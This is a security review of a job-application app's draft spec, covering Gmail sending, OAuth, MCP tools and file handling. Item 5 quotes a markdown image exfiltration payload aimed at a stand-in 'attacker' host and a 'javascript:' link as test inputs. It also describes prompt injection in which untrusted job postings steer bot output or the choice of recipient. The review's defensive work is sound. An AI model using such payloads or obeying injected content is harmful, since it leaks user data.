# Security review: cockpit SPEC.md (draft v1)

Checked against: encryption.ts, mcp/route.ts, mcp/auth.ts, mcpToken.actions.ts, middleware.ts, auth.config.ts, actions/shared.ts, profile/files.ts, profile/resume route, backup export/import, agent/markdown.ts, next.config.mjs, mcp/rate-limit.ts, schema `File`.
No Critical issue found. Items are ordered by severity.

## Important

### 1. Send lock does not freeze the package during the Gmail call (§6.4 steps 2-5, §6.1, §2.2 step 7)
The lock only sets `sendStartedAt`. `status` stays `approved` during the Gmail call. In that window:
- another tab can unapprove, reject or request changes, or edit the content;
- the bot can submit a new version, which supersedes the package;
- step 5 then sets `sent` unconditionally. The mail has gone out, but the record shows `rejected`/`superseded` or the sent content differs from what was shown.

Fix:
- Add `sendStartedAt: null` to the `where` of every §6.1 `updateMany`, including `updatePackageContent`, and to the §2.2 step 7 supersede.
- A submit that meets a locked package returns `CONFLICT`.
- Make step 5's package update conditional: `updateMany({ where: { id, userId, status: "approved", sendStartedAt: { not: null } } })`. Treat count 0 as a logged inconsistency.
- Have `sendPackage(packageId, expectedUpdatedAt)` compare the `updatedAt` the user confirmed in the dialog, and re-read the content after taking the lock (the current step 1 reads before it).

### 2. Lock is cleared on ambiguous Gmail failures, so a duplicate send is possible (§6.4 step 4)
"On Gmail failure: clear `sendStartedAt`" also covers timeouts, connection resets and 5xx responses. In those cases the message may already be sent, and a retry would send a second application to the recruiter.

Fix:
- Clear the lock only on definitive pre-send failures: token endpoint failure, or a Gmail 4xx that is not 429 (400/401/403).
- On timeout, network error or 5xx, keep the lock and set a `needs_check` state. The UI shows "Check your Gmail Sent folder", with two explicit actions: "Mark as sent (manual)" and "Release lock".
- Set a fetch timeout (e.g. 20 s).
- Also document the process-crash case (lock held, nothing sent): it needs the same explicit release action. The spec only covers the "sent but transaction failed" case.

### 3. The PDF iframe will be blocked by the existing global `X-Frame-Options: DENY` (§4, §5.3, §9)
`next.config.mjs` sets `X-Frame-Options: DENY` on `/(.*)`. DENY also blocks same-origin framing. §4 serves the PDF inline for an iframe, and next.config.mjs is not in the §9 core-edit list.

The likely "fix" would be to loosen the header globally.

Fix:
- Add a `next.config` header rule scoped to `/api/cockpit/files/:id` (`X-Frame-Options: SAMEORIGIN` plus `Content-Security-Policy: frame-ancestors 'self'`).
- Add the file to the §9 list.
- Test it, since route-handler headers vs config-header precedence is easy to get wrong.
- Also send `Content-Security-Policy: sandbox` on the PDF response. This is the sandbox attribute on the PDF resource itself, so any PDF JavaScript runs isolated from the app origin. The only check on `attach_file` content is the `%PDF-` magic.

### 4. MCP payload and storage are unbounded (§3 `attach_file`, §2.3)
- `contentBase64` has no schema max. The decoded size is checked only after decoding.
- `route.ts` hands the raw request to `transport.handleRequest(req)` with no body cap, so a 5 MB PDF means about 6.7 MB of JSON.
- The existing rate limit is 60 calls/hour/user (`MCP_RATE_LIMIT_MAX`) and is not size-aware.
- Unreferenced files are never cleaned (explicitly out of scope). A leaked token can write 60 × 5 MB per hour to `/data` until the disk is full.
- A cap on the base64 length alone does not stop that.

Fix:
- `z.string().max(7_000_000)` on `contentBase64`.
- Reject early in the cockpit handler based on `Content-Length`.
- Per-user quota: at most N `cockpit/<userId>` files and M MB (e.g. 200 files / 500 MB). Return `TOO_LARGE` beyond it.
- Dedupe by sha256.
- Reuse `checkMcpRateLimit`, and add a stricter dedicated bucket for `attach_file`.

### 5. Cover letter / fit analysis rendering must reuse the hardened renderer (§5.3 panel 5, panel 3)
- The spec only says "markdown-it with `html:false`".
- The repo's `src/lib/agent/markdown.ts` also does `md.disable(["image","link","autolink"])`. Its comment says markdown links and images are network requests (tracking pixels, exfiltration) steered by injected posting content.
- The cockpit renders bot output that was produced from untrusted job postings, so it has the same threat model.
- With only `html:false`, `![](https://attacker/x.png?...)` loads automatically when the page is opened.
- The spec does not say how the HTML is injected. A bare `dangerouslySetInnerHTML` gives no defense in depth, whereas `TipTapContentViewer` strips unrecognized tags.

Fix:
- Use `renderAgentMarkdown`-style config (links and images disabled) and pass the result through `TipTapContentViewer`, as `JobDetails` does.
- Add a test that `![x](http://a/b.png)` and `[x](javascript:alert(1))` produce no `<img>` or `<a>`.
- `emailBody` and `fitAnalysis` are plain text or `<pre>`; never use innerHTML for them.

### 6. Callback redirect and cookie `Secure` derive from the request (§6.2)
- "Secure when the request is https" and `redirect(/dashboard/review/settings…)` built from `req.url`: in the standalone/Docker build behind a TLS proxy, `req.url` is `http://0.0.0.0:3000`.
- The cookie then loses `Secure`, and the redirect goes to the wrong host.
- It also trusts the client-controlled `Host`/`X-Forwarded-*` headers.

Fix:
- Derive the scheme and base URL from `GOOGLE_REDIRECT_URI` (same origin), and always redirect to `new URL(path, <origin of GOOGLE_REDIRECT_URI>)`.
- Cookie attributes: `Path=/api/cockpit/gmail`, `HttpOnly`, `SameSite=Lax`, `Max-Age=600`, `Secure` iff the redirect URI is https.
- Delete the cookie on every callback exit path, including errors.

### 7. The OAuth state is not bound to the app user, and the callback handles `error`/`refresh_token` loosely (§6.2)
- The state is only compared against a cookie. Put `userId` into the cookie payload (`{state, verifier, userId}`) and require that it equals the session user. This stops cross-user completion if two sessions share a browser.
- Check state first, then handle Google's `?error=`.
- Require `refresh_token` in the token response and fail with `no_refresh_token` if it is absent. Otherwise `encrypt(undefined)` throws or an empty token is stored.
- On reconnect the upsert overwrites the old refresh token, which stays valid at Google. Revoke the previous token (best effort) before replacing it.
- Make `?error=` an enum, and render the banner from a fixed code→message map. Never print the raw query value.

### 8. `COCKPIT_GMAIL_ALLOWED_ADDRESS` is optional, and `id_token` handling is thin (§6.2, §7)
- Without the allow-list, any Google account that authorizes the app becomes the sender identity. With one registered user this is low risk, but the default is permissive.
- Fix: make the allow-list required to enable Send (otherwise the settings card says "set COCKPIT_GMAIL_ALLOWED_ADDRESS"), or require an explicit "this is me" confirmation of the address.
- Skipping signature verification is acceptable (the token comes straight from the token endpoint over TLS; OIDC Core 3.1.3.7). It should still check `aud === GOOGLE_CLIENT_ID`, `iss ∈ {accounts.google.com, https://accounts.google.com}` and `exp`. These checks cost nothing.
- Treat `email_verified` as `true` or `"true"` (from memory, Google's `email_verified` can arrive as a string; not verified here).
- Add a `nonce` (cheap).

### 9. Secrets in logs and in client payloads (§6.2 "never logged", §5.5, §6.4)
- The repo logs errors as `log.error("…", { error: String(error) })`. The cockpit code has two places where this can leak:
  - a thrown error that embeds the token endpoint response or the request;
  - the Gmail 4xx body, which may echo parts of the `raw` message.
- Fix:
  - Wrap every token-endpoint, revoke and Gmail call in a function that maps failures to a fixed typed error (`GMAIL_TOKEN`, `GMAIL_SEND`, `GMAIL_RECONNECT_REQUIRED`) with status code only.
  - Never log the response body, the request body or headers.
  - Add a unit test with a mock fetch returning `refresh_token=SECRET` and assert nothing logged contains `SECRET`.
- The settings page (a server component) and `getPackageDetail` must `select` explicit fields from `GmailAccount` (`email`, `scopes`). Never pass `encryptedRefreshToken`/`iv` into props sent to a client component.
- State this in the spec, and add a test.

### 10. "No send path via MCP" is guarded only by a tool-name regex (§3, AC-13, AC-28)
- `/send|approve|reject/` on tool names does not stop a tool named `dispatch_package`, or a handler that imports the send module.
- Fix: replace or complement it with a static import-graph test. Fail if anything under `src/lib/mcp/**` or `src/app/api/mcp/**` (transitively) imports `@/lib/cockpit/send` or `@/lib/cockpit/gmail/client`.
- `send.ts` and `gmail/client.ts` should `import "server-only"`.
- `src/actions/cockpit*.actions.ts` are `"use server"`: every exported async function there is a public POST endpoint. Only export the intended actions. Keep helpers (`sendApplicationPackage`, `buildMimeMessage`) in non-`use server` modules, as `actions/shared.ts` already does.

## Minor

### 11. Server-action auth must not rely on the middleware (§1 P1, §6.1, §6.4)
- The middleware matcher covers only `/dashboard*` and `/api/(not auth|mcp)*`.
- Server actions are POSTs that can be sent to any path, including unmatched ones such as `/` or `/signin`, where `authorized()` returns true for logged-out users. The only real guard is `requireUser()` inside each action.
- The spec already says so. Make it a test: for every exported function in `cockpit*.actions.ts`, mock `getCurrentUser → null` and assert it returns failure with no DB write.
- Put `requireUser()` before the flag check and before any DB access. Order the checks so that anonymous callers cannot probe whether the flag is on.
- Next 15 checks `Origin` vs `Host` on actions, which gives CSRF protection. Do not set `serverActions.allowedOrigins`.

### 12. File path confinement details (§2.2 step 5, §4)
- Today `UPLOADS_DIR` is the relative string `"data"` in dev, so stored `File.filePath` values are relative.
- "lies under `<UPLOADS_DIR>/files/cockpit/<userId>/`" must be done on `path.resolve()`/`fs.realpath()` of both sides. Compare with a trailing separator (`startsWith(base + path.sep)`), because plain prefix matching accepts `cockpit/u1` vs `cockpit/u10`.
- The File model has no `userId` and no owner link besides `ApplicationPackage.cvFileId` / the path. So `cvFileId` ownership at submit time is path-only.
- Fix: write the helper once (`resolveCockpitFile(userId, file)`) and use it in submit, send and the file route.
- The file route should also take the id from the package (`/api/cockpit/files/[packageId]`) rather than a bare `fileId`, so the ownership join is a single query on `userId`.
- Never use the stored `fileName` in `Content-Disposition`; use the generated sanitized name.

### 13. Guard the review actions against the bot-controlled recipient (§5.3 Send dialog, §2.3)
- `emailTo` is chosen by the bot, whose input comes from untrusted job postings. The confirm dialog is the only barrier.
- Fix: in the dialog show To in large text, and a warning when the recipient domain does not match the job's company or URL domain (e.g. a free-mail domain).
- Re-run the §2.3 validation of `emailTo`/`emailSubject` inside `sendApplicationPackage` itself (it reads from the DB, but defense in depth against rows created by older code paths).
- `buildMimeMessage` must also reject CR/LF in the attachment file name and in `To` (the spec only says "any header value").

### 14. MCP conventions in the spec don't match the code (§3 errors, §3 scopes)
- §3 says errors use "the existing MCP error style (`isError: true`)". The existing handlers in `route.ts` return plain `content` text with no `isError`, and scope checks are inline in `route.ts` (`Insufficient scope. Required: …`).
- AC-09 expects `UNAUTHORIZED_SCOPE`. Pick one style explicitly. If `isError` is new, say so. It is safer for the bot, which can then distinguish a rejected submission from success.
- `review_resume`/`save_resume_review` have no scope gate (by design, in `route.ts`). Do not copy that pattern.
- `createMcpToken` hardcodes the scopes array, so every new token gets `package:write`. Consider a separate token (or a scope toggle) for the bot, so the existing jobs-only tokens stay least-privilege.

### 15. Encryption helper properties to note (§6.2, §2 `GmailAccount`)
- `encrypt()` (AES-256-GCM, PBKDF2 per call, random salt/IV) is sound for this use. The data is not bound to the row (no AAD), so a ciphertext copied between rows still decrypts. This needs DB write access, so it is low risk.
- `decrypt()` throws if `ENCRYPTION_KEY` is missing or has changed, and `encrypt()` throws when it is unset. The callback must check `ENCRYPTION_KEY` before exchanging the code, so the refresh token is never left unstored at Google.
- Send must map a decrypt failure to a typed `GMAIL_RECONNECT_REQUIRED` error, not a 500.
- PBKDF2 at 100k iterations on every send/decrypt costs about 50 ms; no change needed.
- Backups: `collectBackupData` builds a zod-validated `BackupDataSchema` (I did not read the whole file, so check that no generic table dump exists). State in the spec that `GmailAccount` must stay out of the backup, since a backup zip would then carry the refresh token.
